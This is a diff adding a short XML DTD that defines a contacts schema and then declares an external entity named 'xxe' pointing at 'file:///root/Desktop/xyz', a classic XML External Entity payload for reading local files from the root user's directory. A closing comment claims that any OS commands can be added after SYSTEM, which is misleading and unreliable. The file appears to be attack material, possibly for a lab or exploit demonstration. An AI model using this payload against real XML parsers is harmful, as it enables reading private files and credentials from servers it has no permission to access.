@@ -1,0 +1,7 @@
+<!ELEMENT contacts (contact*)>
+<!ELEMENT contact (firstname,lastname)>
+<!ELEMENT firstname (#PCDATA)>
+<!ELEMENT lastname ANY>
+<!ENTITY xxe SYSTEM "file:///root/Desktop/xyz">   
+
+<!-- You can add any OS commands after SYSTEM-->
